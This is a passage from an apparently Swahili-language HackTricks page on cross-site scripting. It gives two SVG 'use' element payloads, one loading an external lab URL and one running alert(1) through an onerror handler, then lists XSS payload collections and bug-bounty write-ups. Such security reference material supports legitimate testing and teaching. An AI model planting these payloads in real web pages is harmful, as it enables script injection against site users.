</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Pata **SVG payloads zaidi katika** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Mbinu mbalimbali za JS & Taarifa Muhimu


{{#ref}}
other-js-tricks.md
{{#endref}}

## Rasilimali za XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Marejeo

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
